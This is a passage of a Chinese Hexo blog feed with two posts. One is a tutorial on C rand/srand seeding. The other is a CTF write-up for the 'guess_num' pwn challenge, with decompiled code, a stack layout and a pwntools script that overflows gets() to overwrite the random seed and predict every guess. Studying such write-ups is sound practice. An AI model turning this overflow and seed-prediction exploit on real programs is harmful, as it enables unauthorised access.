    <link href="http://yoursite.com/2019/07/27/rang%E5%92%8Csrand%E5%87%BD%E6%95%B0%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2019/07/27/rang和srand函数的使用/</id>
    <published>2019-07-27T03:41:13.098Z</published>
    <updated>2019-07-27T04:06:37.079Z</updated>
    
    <content type="html"><![CDATA[<h3 id="函数的作用"><a href="#函数的作用" class="headerlink" title="函数的作用"></a>函数的作用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void srand(unsigned seed);//srand函数是随机数发生器的初始化函数</span><br><span class="line">int rand(void)//rand函数用来产生随机数，当然是伪随机数</span><br><span class="line"></span><br><span class="line">seed的作用： srand函数的作用是根据参数seed，设置一个随机起始点，而rand函数根据这个起始点，产生随机数序列。默认的随机种子为1.如果随机种子一样，rand函数所产生的随机序列也一样。因此,为使每次程序运行都能产生不同的随机序列，每次都应产生一个不同的种子参数。</span><br><span class="line"></span><br><span class="line">因为rand的内部实现是用线性同余法做的，它不是真的随机数，只不过是因为其周期特别长，所以有一定的范围里可看成是随机的，rand()会返回一随机数值，范围在0至RAND_MAX间。在调用此函数产生随机数前，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。rand()产生的是假随机数字，每次执行时是相同的。若要不同,以不同的值来初始化它.初始化的函数就是srand()。</span><br><span class="line"></span><br><span class="line">返回值</span><br><span class="line">返回0至RAND_MAX之间的随机整数值，RAND_MAX的范围最少是在32767之间（int），即双字节（16位数）。若用unsigned int 双字节是65535，四字节是4294967295的整数范围。</span><br></pre></td></tr></table></figure><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">//取得0～6之间的随机整数  </span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;  </span></span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0;i&lt;10;i++)  </span><br><span class="line"></span><br><span class="line">    &#123;   </span><br><span class="line"></span><br><span class="line">        ran_num=rand()%6;  </span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;ran_num&lt;&lt;<span class="string">" "</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">//由于种子默认都是1，故每次运行都将输出：5 5 4 4 5 4 0 0 4 2</span><br><span class="line"></span><br><span class="line">//将seed指定为6的话</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;  </span></span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    srand(6);  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0;i&lt;10;i++)  </span><br><span class="line"></span><br><span class="line">    &#123;   </span><br><span class="line"></span><br><span class="line">        ran_num=rand()%6;  </span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;ran_num&lt;&lt;<span class="string">" "</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">//每次运行都将输出：每次运行都将输出：4 1 5 1 4 3 4 4 2 2</span><br><span class="line"></span><br><span class="line">举例4：那么我们如何产生一个伪随机的种子呢？一般指定seed为当前系统流逝了的时间（单位为秒）：time_t time(0)：</span><br><span class="line"></span><br><span class="line">//取得0～6之间的随机整数  </span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;ctime&gt;//时间函数  </span></span><br><span class="line"></span><br><span class="line">int main()  </span><br><span class="line"></span><br><span class="line">&#123;  </span><br><span class="line"></span><br><span class="line">    srand((unsigned)time(0));  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(int i=0;i&lt;10;i++)  </span><br><span class="line"></span><br><span class="line">    &#123;   </span><br><span class="line"></span><br><span class="line">        ran_num=rand()%6;  </span><br><span class="line"></span><br><span class="line">        cout&lt;&lt;ran_num&lt;&lt;<span class="string">" "</span>;  </span><br><span class="line"></span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">       第一次运行时输出：0 1 5 4 5 0 2 3 4 2</span><br><span class="line"></span><br><span class="line">       第二次：3 2 3 0 3 5 5 2 2 3</span><br><span class="line"></span><br><span class="line">       总之，每次运行结果将不一样，因为每次启动程序的时刻都不同</span><br><span class="line"></span><br><span class="line">原文：https://blog.csdn.net/lianghui0811/article/details/76480664</span><br></pre></td></tr></table></figure><h3 id="关于time-t-time-0"><a href="#关于time-t-time-0" class="headerlink" title="关于time_t time(0)"></a>关于time_t time(0)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">time_t被定义为长整型，它返回从1970年1月1日零时零分零秒到目前为止所经过的时间，单位为秒。比如假设输出：</span><br><span class="line"></span><br><span class="line">       cout&lt;&lt;time(0);</span><br><span class="line"></span><br><span class="line">      值约为1169174701，约等于37（年）乘365（天）乘24（小时）乘3600（秒）（月日没算）。</span><br><span class="line"></span><br><span class="line">      另外，关于ran_num = rand() % 6，将rand()的返回值与6求模是必须的，这样才能确保目的随机数落在[0,6)之间，否则rand()的返回值本身可能是很巨大的。</span><br><span class="line"></span><br><span class="line">      一个通用的公式是：</span><br><span class="line"></span><br><span class="line">      要取得[a,b)之间的随机整数，使用(rand() % (b<span class="_">-a</span>))+ a（结果值将含a不含b）。在a为0的情况下，简写为rand() % b。</span><br><span class="line"></span><br><span class="line">      另外还有一种比较常用的产生随机种子的函数：</span><br><span class="line"></span><br><span class="line">       srand(time(NULL)); //是以当前时间为种子，产生随意数。其中,time(NULL)用来获取当前时间，本质上得到的是一个大整数，然后用这个数来随机数。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;函数的作用&quot;&gt;&lt;a href=&quot;#函数的作用&quot; class=&quot;headerlink&quot; title=&quot;函数的作用&quot;&gt;&lt;/a&gt;函数的作用&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;
      
    
    </summary>
    
      <category term="理论知识" scheme="http://yoursite.com/categories/%E7%90%86%E8%AE%BA%E7%9F%A5%E8%AF%86/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>guess_num</title>
    <link href="http://yoursite.com/2019/07/27/guess_num/"/>
    <id>http://yoursite.com/2019/07/27/guess_num/</id>
    <published>2019-07-27T03:31:33.086Z</published>
    <updated>2019-07-27T04:02:25.396Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Downloads$ checksec guess_num</span><br><span class="line">[*] <span class="string">'/home/xfgg/Downloads/guess_num'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">_int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [rsp+4h] [rbp-3Ch]</span><br><span class="line">  int i; // [rsp+8h] [rbp-38h]</span><br><span class="line">  int v6; // [rsp+Ch] [rbp-34h]</span><br><span class="line">  char v7; // [rsp+10h] [rbp-30h]</span><br><span class="line">  unsigned int seed[2]; // [rsp+30h] [rbp-10h]</span><br><span class="line">  unsigned __int64 v9; // [rsp+38h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  setbuf(stdin, 0LL);</span><br><span class="line">  setbuf(stdout, 0LL);</span><br><span class="line">  setbuf(stderr, 0LL);</span><br><span class="line">  v4 = 0;</span><br><span class="line">  v6 = 0;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();</span><br><span class="line">  puts(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  puts(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  puts(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  puts(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>, 0LL);</span><br><span class="line">  gets((__int64)&amp;v7);</span><br><span class="line">  srand(seed[0]);</span><br><span class="line">  <span class="keyword">for</span> ( i = 0; i &lt;= 9; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % 6 + 1;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (unsigned int)(i + 1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">    puts(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      puts(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(1);</span><br><span class="line">    &#125;</span><br><span class="line">    puts(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  <span class="built_in">return</span> 0LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sub_c3e中有system(<span class="string">"cat flag"</span>);</span><br></pre></td></tr></table></figure><h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">-0000000000000030 var_30          db ?</span><br><span class="line">-000000000000002F                 db ? ; undefined</span><br><span class="line">-000000000000002E                 db ? ; undefined</span><br><span class="line">-000000000000002D                 db ? ; undefined</span><br><span class="line">-000000000000002C                 db ? ; undefined</span><br><span class="line">-000000000000002B                 db ? ; undefined</span><br><span class="line">-000000000000002A                 db ? ; undefined</span><br><span class="line">-0000000000000029                 db ? ; undefined</span><br><span class="line">-0000000000000028                 db ? ; undefined</span><br><span class="line">-0000000000000027                 db ? ; undefined</span><br><span class="line">-0000000000000026                 db ? ; undefined</span><br><span class="line">-0000000000000025                 db ? ; undefined</span><br><span class="line">-0000000000000024                 db ? ; undefined</span><br><span class="line">-0000000000000023                 db ? ; undefined</span><br><span class="line">-0000000000000022                 db ? ; undefined</span><br><span class="line">-0000000000000021                 db ? ; undefined</span><br><span class="line">-0000000000000020                 db ? ; undefined</span><br><span class="line">-000000000000001F                 db ? ; undefined</span><br><span class="line">-000000000000001E                 db ? ; undefined</span><br><span class="line">-000000000000001D                 db ? ; undefined</span><br><span class="line">-000000000000001C                 db ? ; undefined</span><br><span class="line">-000000000000001B                 db ? ; undefined</span><br><span class="line">-000000000000001A                 db ? ; undefined</span><br><span class="line">-0000000000000019                 db ? ; undefined</span><br><span class="line">-0000000000000018                 db ? ; undefined</span><br><span class="line">-0000000000000017                 db ? ; undefined</span><br><span class="line">-0000000000000016                 db ? ; undefined</span><br><span class="line">-0000000000000015                 db ? ; undefined</span><br><span class="line">-0000000000000014                 db ? ; undefined</span><br><span class="line">-0000000000000013                 db ? ; undefined</span><br><span class="line">-0000000000000012                 db ? ; undefined</span><br><span class="line">-0000000000000011                 db ? ; undefined</span><br><span class="line">-0000000000000010 seed            dd 2 dup(?)</span><br><span class="line"></span><br><span class="line">发现var_30在栈中占0x20，可以覆盖到seed</span><br><span class="line">如果使输入的guessnumber，即v4等于随机数v6，即可cat flag。</span><br></pre></td></tr></table></figure><h3 id="0x03攻击"><a href="#0x03攻击" class="headerlink" title="0x03攻击"></a>0x03攻击</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">关于rand和srand</span><br><span class="line">随机函数生成的随机数并不是真的随机数，他们只是在一定范围内随机，实际上是一段数字的循环，这些数字取决于随机种子。在调用rand()函数时，必须先利用srand()设好随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</span><br><span class="line">对于该题目，我们将随机种子设置为0或1都可，参考文件中的循环来写脚本。</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"/home/xfgg/Downloads/guess_num"</span>)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * 0x20 + p64(1)</span><br><span class="line">io.recvuntil(<span class="string">'your name:'</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">libc.srand(1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(10):</span><br><span class="line">    num = str(libc.rand()%6+1)</span><br><span class="line">    io.recvuntil(<span class="string">'number:'</span>)</span><br><span class="line">    io.sendline(num)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-寻找漏洞&quot;&gt;&lt;a href=&quot;#0x01-寻找漏洞&quot; class=&quot;headerlink&quot; title=&quot;0x01 寻找漏洞&quot;&gt;&lt;/a&gt;0x01 寻找漏洞&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td
      
    
    </summary>
    
      <category term="攻防世界" scheme="http://yoursite.com/categories/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
</feed>
